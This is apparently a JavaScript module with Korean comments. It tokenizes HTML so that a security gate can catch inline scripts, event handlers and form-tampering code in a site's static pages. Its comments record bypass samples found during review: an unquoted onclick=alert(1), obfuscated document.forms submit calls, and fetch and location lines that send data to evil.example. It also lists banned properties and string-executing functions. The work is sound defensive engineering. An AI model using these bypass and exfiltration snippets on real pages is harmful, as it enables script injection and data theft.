/* HTML 토크나이저 — 게이트 전용 (CommonJS)
 *
 * 왜 만들었나 (260809)
 * ────────────────────
 * desk/*.html 을 «정규식»으로 검사하다가 Codex 교차검토에서 4라운드 연속 새 구멍이 나왔다.
 *   R2  주석 안의 가짜 마크업을 진짜로 읽음
 *   R3  `</script/>` 를 종료 태그로 못 읽음
 *   R4  `onclick=` 속성은 <script> 검사를 통째로 비켜 감
 *   R5  ①인용부호 «없는» 속성(`onclick=alert(1)`) 미수집
 *       ②«닫히지 않은» `<script src>` 미수집
 *       ③JS 문자열 속 `<!-- … -->` 로 실행 코드를 «검사에서만» 지움
 *       ④요소 «경계»를 indexOf 로 잡아 label 밖 고지가 label 안으로 합쳐짐
 * 넷 다 원인이 같다 — 정규식은 HTML 의 «상태»(원시텍스트 구간·주석 구간·속성 구간)를
 * 모른다. 패치를 더 붙이는 대신 상태를 가진 토크나이저를 쓴다.
 *
 * 범위: HTML5 토크나이저의 «완전» 구현이 아니다. 이 저장소의 정적 페이지를 판정하는 데
 * 필요한 규칙만 정확히 구현한다 — 그 외 입력에는 쓰지 말 것.
 *   · 데이터 구간에서 `<!--` 는 `-->` 까지 주석
 *   · <script>·<style> 안은 «원시 텍스트» — 주석도 문자열도 해석하지 않고 `</script` 에서만 끝난다
 *     (HTML 명세: 종료 태그 이름 뒤에는 공백·`/`·`>` 무엇이 와도 종료로 본다)
 *   · 속성은 `name` · `name=값` · `name="값"` · `name='값'` 네 형태 모두
 */

'use strict';

const RAWTEXT = new Set(['script', 'style', 'textarea', 'title']);
/* 닫는 태그를 쓰지 않는 요소 — 스택에 쌓으면 안 된다 */
const VOID = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input',
  'link', 'meta', 'param', 'source', 'track', 'wbr']);

/** 여는 태그의 속성 문자열을 {이름(소문자) → 값} 으로. 값 없는 속성은 '' */
function parseAttrs(src) {
  const out = new Map();
  let i = 0;
  while (i < src.length) {
    while (i < src.length && /[\s/]/.test(src[i])) i++;
    if (i >= src.length) break;
    let s = i;
    while (i < src.length && !/[\s=/]/.test(src[i])) i++;
    const name = src.slice(s, i).toLowerCase();
    if (!name) { i++; continue; }
    while (i < src.length && /\s/.test(src[i])) i++;
    /* ⚠️ 속성이 «중복»되면 브라우저는 «앞»의 것을 쓰고 뒤를 버린다 (HTML 명세: duplicate
       attribute 는 parse error 로 무시). Map.set 으로 덮어쓰면 정반대가 되어,
       `<button onclick="this.form.submit()" ... onclick="jtTrackCta(…)">` 같은 마크업에서
       «실제로 실행되는» 앞의 코드를 못 보고 통과시킨다 — 음성 대조군 ㋒ 가 이걸 잡았다. */
    const put = (k, v) => { if (!out.has(k)) out.set(k, v); };
    if (src[i] !== '=') { put(name, ''); continue; }        // 값 없는 속성 (required 등)
    i++;
    while (i < src.length && /\s/.test(src[i])) i++;
    const q = src[i];
    if (q === '"' || q === "'") {
      const e = src.indexOf(q, i + 1);
      put(name, e < 0 ? src.slice(i + 1) : src.slice(i + 1, e));
      i = e < 0 ? src.length : e + 1;
    } else {                                               // ⚠️ 인용부호 없는 값 (R5 P0)
      s = i;
      while (i < src.length && !/[\s>]/.test(src[i])) i++;
      put(name, src.slice(s, i));
    }
  }
  return out;
}

/**
 * @returns {Array<{type:'text'|'comment'|'open'|'close', name?:string,
 *                  attrs?:Map<string,string>, raw:string, text?:string,
 *                  start:number, end:number, selfClosing?:boolean}>}
 */
function tokenize(html) {
  const toks = [];
  let i = 0;
  const pushText = (s, e) => { if (e > s) toks.push({ type: 'text', text: html.slice(s, e), raw: html.slice(s, e), start: s, end: e }); };

  while (i < html.length) {
    const lt = html.indexOf('<', i);
    if (lt < 0) { pushText(i, html.length); break; }
    pushText(i, lt);

    if (html.startsWith('<!--', lt)) {
      let e = html.indexOf('-->', lt + 4);
      e = e < 0 ? html.length : e + 3;                     // 닫히지 않은 주석은 문서 끝까지
      toks.push({ type: 'comment', raw: html.slice(lt, e), text: html.slice(lt + 4, Math.max(lt + 4, e - 3)), start: lt, end: e });
      i = e; continue;
    }
    if (html.startsWith('<!', lt) || html.startsWith('<?', lt)) {    // doctype 등
      let e = html.indexOf('>', lt);
      e = e < 0 ? html.length : e + 1;
      toks.push({ type: 'text', text: '', raw: html.slice(lt, e), start: lt, end: e });
      i = e; continue;
    }
    const isClose = html[lt + 1] === '/';
    const nameStart = lt + (isClose ? 2 : 1);
    let p = nameStart;
    while (p < html.length && /[A-Za-z0-9:-]/.test(html[p])) p++;
    const name = html.slice(nameStart, p).toLowerCase();
    if (!name) { pushText(lt, lt + 1); i = lt + 1; continue; }       // `<` 뒤가 이름이 아니면 그냥 글자
    /* ⚠️ 태그의 끝은 «따옴표 밖»의 `>` 다 (260809 Codex R6 P0). 단순 indexOf 로 찾으면
       `onclick="jtTrackCta('a','b')>alert(1)"` 처럼 값 «안»에 `>` 가 있을 때 속성이 잘려,
       브라우저는 전체 식을 실행하는데 게이트는 앞부분만 보고 통과시킨다.
       (브라우저 실측: getAttribute('onclick') === "jtTrackCta('a','b')>alert(1)") */
    let gt = -1, q = 0;
    for (let k = p; k < html.length; k++) {
      const c = html[k];
      if (q) { if (c === (q === 1 ? '"' : "'")) q = 0; continue; }
      if (c === '"') q = 1;
      else if (c === "'") q = 2;
      else if (c === '>') { gt = k; break; }
    }
    /* 닫히지 않은 태그(문서 끝까지 `>` 가 없음)도 «태그로» 잡는다 — 종전엔 정규식이
       매치되지 않아 통째로 사라졌고, 그 틈으로 `<script src=…` 가 검사를 피했다 (R5 P0). */
    const tagEnd = gt < 0 ? html.length : gt + 1;
    const attrSrc = html.slice(p, gt < 0 ? html.length : gt);
    if (isClose) {
      toks.push({ type: 'close', name, raw: html.slice(lt, tagEnd), start: lt, end: tagEnd });
      i = tagEnd; continue;
    }
    /* ⚠️ HTML 문서에서 자기닫힘 슬래시는 «void·foreign 요소에만» 의미가 있다 (R6 P0).
       `<script/>` 는 자기닫힘이 아니라 원시텍스트 구간을 «연다» — 그걸 자기닫힘으로 보면
       그 뒤의 실행 코드를 통째로 놓친다.
       브라우저 실측: 여는 `script` 뒤에 슬래시를 붙여도 script 는 1개이고, 그 뒤 내용이
       모두 본문으로 들어간다 (DOMParser 확인, 260809). */
    const selfClosing = /\/\s*$/.test(attrSrc) && !RAWTEXT.has(name);
    toks.push({ type: 'open', name, attrs: parseAttrs(attrSrc), raw: html.slice(lt, tagEnd), start: lt, end: tagEnd, selfClosing });
    i = tagEnd;

    if (RAWTEXT.has(name)) {
      /* ⚠️ 원시 텍스트 구간 — 안의 주석·문자열은 «해석하지 않는다». 이걸 몰라서
         JS 문자열 속 `<!--` 로 실행 코드를 검사에서만 지울 수 있었다 (R5 P0).
         종료는 `</script` 로 시작하는 지점 — 뒤에 `/`·공백·속성이 붙어도 종료다. */
      const re = new RegExp('</' + name + '(?=[\\s/>]|$)', 'i');
      const rest = html.slice(i);
      const m = rest.match(re);
      const rawEnd = m ? i + m.index : html.length;
      if (rawEnd > i) toks.push({ type: 'text', text: html.slice(i, rawEnd), raw: html.slice(i, rawEnd), start: i, end: rawEnd });
      i = rawEnd;
    }
  }
  return toks;
}

/** 여는 태그 토큰 인덱스 → 그 요소가 닫히는 토큰 인덱스(닫는 태그 포함). 없으면 toks.length */
function elementEnd(toks, openIdx) {
  const t = toks[openIdx];
  if (!t || t.type !== 'open') return openIdx;
  if (t.selfClosing || VOID.has(t.name)) return openIdx + 1;
  let depth = 0;
  for (let k = openIdx + 1; k < toks.length; k++) {
    const x = toks[k];
    if (x.type === 'open' && x.name === t.name && !x.selfClosing && !VOID.has(x.name)) depth++;
    else if (x.type === 'close' && x.name === t.name) {
      if (depth === 0) return k + 1;
      depth--;
    }
  }
  return toks.length;
}

/** 토큰 구간의 «보이는 글자» (주석·원시텍스트 제외) */
function textBetween(toks, from, to) {
  let s = '';
  for (let k = from; k < to && k < toks.length; k++) {
    const t = toks[k];
    if (t.type === 'text' && !(toks[k - 1] && toks[k - 1].type === 'open' && RAWTEXT.has(toks[k - 1].name))) s += t.text;
  }
  return s;
}

/* JavaScript MIME type «essence» 목록 (WHATWG MIME Sniffing).
   ⚠️ script 의 type «속성»은 essence 와 정확히 일치해야 실행된다 — 파라미터가 붙으면
      실행되지 않는다. 브라우저 실측(260809, script 를 문서에 넣어 평가 여부 확인):
        (속성없음)·(빈문자)·text/javascript·application/javascript·application/ecmascript
        ·application/x-ecmascript·application/x-javascript·text/ecmascript·text/jscript
        ·text/x-javascript  → 실행됨
        text/javascript; charset=utf-8 · text/javascript;charset=utf-8 · text/plain
        · application/ld+json                                          → 실행 안 됨
   내가 두 번 틀렸다 — 처음엔 목록이 모자랐고(실행되는 걸 「비 JS」로 봄), 그다음엔
   파라미터를 떼어 «실행되지 않는» 것을 실행으로 봤다. 둘 다 검사 결과를 뒤집는다. */
const JS_MIME_ESSENCE = new Set([
  'application/ecmascript', 'application/javascript', 'application/x-ecmascript',
  'application/x-javascript', 'text/ecmascript', 'text/javascript',
  'text/javascript1.0', 'text/javascript1.1', 'text/javascript1.2', 'text/javascript1.3',
  'text/javascript1.4', 'text/javascript1.5', 'text/jscript', 'text/livescript',
  'text/x-ecmascript', 'text/x-javascript',
]);

/** script 의 type 속성이 «실행되는 JS» 를 뜻하는가 */
function isExecutableScriptType(raw) {
  if (raw === undefined || raw === null) return true;          // 속성 없음 → classic script
  const t = String(raw).trim().toLowerCase();
  if (t === '') return true;                                   // 빈 문자열도 classic script
  if (t === 'module') return true;                             // 모듈 — 비동기지만 실행된다
  return JS_MIME_ESSENCE.has(t);                               // 파라미터가 붙으면 실행 안 됨
}

function inlineScripts(toks) {
  const out = [];
  for (let k = 0; k < toks.length; k++) {
    const t = toks[k];
    if (t.type !== 'open' || t.name !== 'script') continue;
    if (t.attrs.has('src')) continue;
    if (!isExecutableScriptType(t.attrs.get('type'))) continue;
    const body = toks[k + 1];
    if (body && body.type === 'text') out.push(body.text);
  }
  return out.join('\n');
}

/** 외부에서 «실행되는» 스크립트의 src 목록 (JSON-LD 등 데이터 type 은 실행되지 않으므로 제외) */
function externalScriptSrcs(toks) {
  return toks
    .filter(t => t.type === 'open' && t.name === 'script' && t.attrs.has('src')
      && isExecutableScriptType(t.attrs.get('type')))
    .map(t => t.attrs.get('src'));
}

/**
 * 인라인 JS(또는 on* 핸들러 본문)가 «DOM·폼을 건드리는가»를 AST 로 판정한다.
 *
 * ⚠️ 종전엔 단어 포함(`/\bform\b|querySelector|…/`)으로 봤다. 그건 우회가 너무 쉽다 —
 *    `document.forms[0]['submit']()` 는 `\bform\b` 에도(forms), `.submit()` 에도(대괄호 접근)
 *    걸리지 않으면서 required 검증을 건너뛴다 (260809 Codex R6 P0). 「AST 는 과하다」던
 *    내 판단이 틀렸다.
 * @returns {string[]} 걸린 이유 목록 (비어 있으면 깨끗)
 */
function domTouches(code) {
  if (!code || !code.trim()) return [];
  let parser;
  try { parser = require('@babel/parser'); } catch (_e) { return ['@babel/parser 없음 — 검사 불가']; }
  let ast;
  try {
    ast = parser.parse(code, { sourceType: 'script', errorRecovery: true, allowReturnOutsideFunction: true });
  } catch (e) { return [`파싱 실패: ${e.message.slice(0, 60)}`]; }

  /* 폼·DOM 을 만지는 통로. 이름은 «점 접근»이든 «대괄호 문자열»이든 똑같이 잡는다. */
  const BANNED_PROP = new Set(['submit', 'requestsubmit', 'forms', 'elements', 'action',
    'novalidate', 'formaction', 'formmethod', 'setattribute', 'insertadjacenthtml',
    'appendchild', 'innerhtml', 'outerhtml', 'querySelector'.toLowerCase(), 'queryselectorall',
    'getelementbyid', 'getelementsbyname', 'getelementsbytagname', 'getelementsbyclassname']);
  /* `document` 는 이 페이지들의 인라인 JS(=GA 부트스트랩)에 애초에 등장하지 않는다 —
     등장 자체를 신호로 본다. 새로 필요해지면 여기 예외를 «명시»하고 사유를 적을 것. */
  const BANNED_ID = new Set(['document']);

  /* ⚠️ 이름을 «가려서» 부르면 위 목록은 전부 소용없다 (260809 Codex R7 P0):
       window['doc'+'ument']['fo'+'rms'][0]['sub'+'mit']()
       eval("…") / Function("…")() / new Function("…")
     정적 분석으로는 이런 «동적 이름»이 무엇을 가리키는지 알 수 없다. 그래서 판정을 뒤집는다 —
     알 수 없는 접근은 «깨끗하다고 볼 수 없으므로» 그 자체를 결함으로 본다.
     이 페이지들의 인라인 JS(=GA 부트스트랩·추적 호출)에는 동적 접근이 애초에 없다. */
  const DYNAMIC_EXEC = new Set(['eval', 'Function', 'setTimeout', 'setInterval', 'importScripts']);
  const hits = new Set();
  (function walk(n) {
    if (!n || typeof n !== 'object') return;
    if (Array.isArray(n)) { n.forEach(walk); return; }
    if (n.type === 'Identifier' && BANNED_ID.has(n.name)) hits.add(n.name);
    /* 문자열을 코드로 바꾸는 통로 — 안을 들여다볼 수 없다 */
    if ((n.type === 'CallExpression' || n.type === 'NewExpression') && n.callee) {
      if (n.callee.type === 'Identifier' && DYNAMIC_EXEC.has(n.callee.name)) hits.add(`${n.callee.name}(문자열 실행)`);
      if (n.callee.type === 'MemberExpression' && n.callee.property
        && n.callee.property.type === 'Identifier' && DYNAMIC_EXEC.has(n.callee.property.name)) {
        hits.add(`${n.callee.property.name}(문자열 실행)`);
      }
    }
    if (n.type === 'MemberExpression') {
      if (!n.computed) {
        if (n.property && n.property.type === 'Identifier' && BANNED_PROP.has(n.property.name.toLowerCase())) {
          hits.add(n.property.name);
        }
      } else if (n.property && n.property.type === 'StringLiteral') {
        if (BANNED_PROP.has(n.property.value.toLowerCase())) hits.add(n.property.value);
      } else if (n.property && (n.property.type === 'NumericLiteral' || n.property.type === 'BigIntLiteral')) {
        /* 배열 첨자 — 이름을 가리는 것이 아니므로 통과 */
      } else {
        /* 이름을 «계산»해서 만든 접근 — 무엇을 가리키는지 알 수 없다 */
        hits.add('동적 속성 접근(정적 확인 불가)');
      }
    }
    for (const k of Object.keys(n)) {
      if (k === 'loc' || k === 'leadingComments' || k === 'trailingComments') continue;
      walk(n[k]);
    }
  })(ast.program);
  return [...hits];
}

/**
 * 코드가 «바깥에서 끌어다 쓰는» 이름(자유 식별자) 목록.
 *
 * ⚠️ 왜 필요한가 (260809 Codex R8 P0) — «금지 목록»으로는 이 게임을 이길 수 없다.
 *    R7 에서 동적 접근·eval 을 막았더니 R8 은 이렇게 뚫었다:
 *      Object.assign(f, { action: '…', noValidate: true });   // 키가 ObjectProperty
 *      Reflect.get(f, 'submit').call(f);                       // 'submit' 이 «인수»
 *    둘 다 MemberExpression 검사에 걸리지 않는다. 금지어를 더 늘려도 다음 라운드에 또 나온다.
 * → 판정을 뒤집는다. 「무엇을 만지면 안 되는가」가 아니라 **「무엇을 써도 되는가」**.
 *    desk 페이지의 인라인 JS 는 GA 부트스트랩 하나뿐이고 쓰는 이름이 정해져 있다.
 *    그 밖의 이름이 «하나라도» 나오면 사람이 본다. (`f`·`Reflect` 모두 여기서 걸린다)
 */
function freeIdentifiers(code) {
  if (!code || !code.trim()) return [];
  let parser;
  try { parser = require('@babel/parser'); } catch (_e) { return ['@babel/parser 없음 — 검사 불가']; }
  let ast;
  try {
    ast = parser.parse(code, { sourceType: 'script', errorRecovery: true, allowReturnOutsideFunction: true });
  } catch (e) { return [`파싱 실패: ${e.message.slice(0, 60)}`]; }

  const declared = new Set();
  const referenced = new Set();
  const declarePattern = (n) => {                 // 구조분해·기본값까지 훑는다
    if (!n || typeof n !== 'object') return;
    if (n.type === 'Identifier') { declared.add(n.name); return; }
    if (n.type === 'ObjectPattern') return n.properties.forEach(p => declarePattern(p.value || p.argument));
    if (n.type === 'ArrayPattern') return n.elements.forEach(declarePattern);
    if (n.type === 'AssignmentPattern') return declarePattern(n.left);
    if (n.type === 'RestElement') return declarePattern(n.argument);
  };
  (function walk(n, parent, key) {
    if (!n || typeof n !== 'object') return;
    if (Array.isArray(n)) { n.forEach(x => walk(x, parent, key)); return; }
    if (n.type === 'VariableDeclarator') declarePattern(n.id);
    if (n.type === 'FunctionDeclaration' || n.type === 'FunctionExpression' || n.type === 'ArrowFunctionExpression') {
      if (n.id) declared.add(n.id.name);
      (n.params || []).forEach(declarePattern);
    }
    if (n.type === 'CatchClause' && n.param) declarePattern(n.param);
    /* ⚠️ 클래스는 «이름 위치»가 여럿이다 (260809 Codex R10 P2) — ClassExpression 의 내부
       이름(`class Inner {}`)은 선언이고, 필드·메서드 키(`field = 1`, `method() {}`)는 참조가
       아니다. 둘 다 빼지 않으면 정상 코드를 «낯선 이름»으로 FAIL 해, 사람이 기준선을
       정당하게 갱신할 때 헛걸음을 만든다. */
    if ((n.type === 'ClassDeclaration' || n.type === 'ClassExpression') && n.id) declared.add(n.id.name);
    if (n.type === 'Identifier') {
      /* «이름을 쓰는 자리»가 아닌 곳은 참조가 아니다 */
      const isMemberProp = parent && parent.type === 'MemberExpression' && key === 'property' && !parent.computed;
      const isObjKey = parent && ['ObjectProperty', 'ObjectMethod', 'ClassProperty', 'ClassMethod',
        'ClassPrivateProperty', 'ClassPrivateMethod', 'PropertyDefinition', 'MethodDefinition']
        .includes(parent.type) && key === 'key' && !parent.computed;
      const isLabel = parent && (parent.type === 'LabeledStatement' || parent.type === 'BreakStatement'
        || parent.type === 'ContinueStatement') && key === 'label';
      if (!isMemberProp && !isObjKey && !isLabel) referenced.add(n.name);
    }
    for (const k of Object.keys(n)) {
      if (k === 'loc' || k === 'leadingComments' || k === 'trailingComments') continue;
      walk(n[k], n, k);
    }
  })(ast.program, null, null);
  /* `arguments`·`this` 는 함수가 자동으로 갖는 것이라 선언이 없다 — 자유 식별자로 세지 않는다 */
  declared.add('arguments'); declared.add('undefined');
  return [...referenced].filter(x => !declared.has(x)).sort();
}

/**
 * 코드가 «점·대괄호로 꺼내 쓰는» 속성 이름 전부.
 *
 * ⚠️ 왜 자유 식별자만으로는 부족한가 (260809, 내가 스스로 찔러서 찾았다) —
 *    허용 전역(window)만 써도 이렇게 빠져나간다:
 *      window.fetch('https://evil.example', {method:'POST', body: …})   // 유출
 *      window.location = 'https://evil.example/?d=' + window.name        // 유출
 *      window.Reflect.get(window.f, 'submit').call(window.f)             // 제출
 *    `window` 는 허용 이름이고 `fetch`·`Reflect` 는 금지 «속성» 목록에 없었다.
 * → 여기서도 뒤집는다. 「쓰면 안 되는 속성」이 아니라 **「써도 되는 속성」**.
 *    이름을 «계산»해 만든 접근은 무엇인지 알 수 없으므로 별도 신호로 돌려준다.
 * @returns {{names:string[], dynamic:boolean}}
 */
function propertyNames(code) {
  if (!code || !code.trim()) return { names: [], dynamic: false };
  let parser;
  try { parser = require('@babel/parser'); } catch (_e) { return { names: ['@babel/parser 없음'], dynamic: true }; }
  let ast;
  try {
    ast = parser.parse(code, { sourceType: 'script', errorRecovery: true, allowReturnOutsideFunction: true });
  } catch (e) { return { names: [`파싱 실패: ${e.message.slice(0, 50)}`], dynamic: true }; }
  const names = new Set();
  let dynamic = false;
  (function walk(n) {
    if (!n || typeof n !== 'object') return;
    if (Array.isArray(n)) { n.forEach(walk); return; }
    if (n.type === 'MemberExpression' || n.type === 'OptionalMemberExpression') {
      if (!n.computed && n.property && n.property.type === 'Identifier') names.add(n.property.name);
      else if (n.computed && n.property && n.property.type === 'StringLiteral') names.add(n.property.value);
      else if (n.computed && n.property
        && (n.property.type === 'NumericLiteral' || n.property.type === 'BigIntLiteral')) { /* 배열 첨자 */ }
      else dynamic = true;
    }
    /* 객체 리터럴의 «키»도 속성이다 — Object.assign(x, {action: …}) 경로 (R8) */
    if ((n.type === 'ObjectProperty' || n.type === 'ObjectMethod')) {
      if (!n.computed && n.key && n.key.type === 'Identifier') names.add(n.key.name);
      else if (!n.computed && n.key && n.key.type === 'StringLiteral') names.add(n.key.value);
      else if (n.computed) dynamic = true;
    }
    for (const k of Object.keys(n)) {
      if (k === 'loc' || k === 'leadingComments' || k === 'trailingComments') continue;
      walk(n[k]);
    }
  })(ast.program);
  return { names: [...names].sort(), dynamic };
}

/** 문서의 모든 on* 핸들러 값 (주석 안은 토크나이저가 애초에 태그로 만들지 않는다) */
function eventHandlers(toks) {
  const out = [];
  for (const t of toks) {
    if (t.type !== 'open') continue;
    for (const [k, v] of t.attrs) if (/^on[a-z]+$/.test(k)) out.push({ attr: k, value: v, tag: t.name });
  }
  return out;
}

module.exports = {
  tokenize, parseAttrs, elementEnd, textBetween,
  inlineScripts, externalScriptSrcs, isExecutableScriptType, eventHandlers, domTouches, freeIdentifiers, propertyNames,
  RAWTEXT, VOID,
};
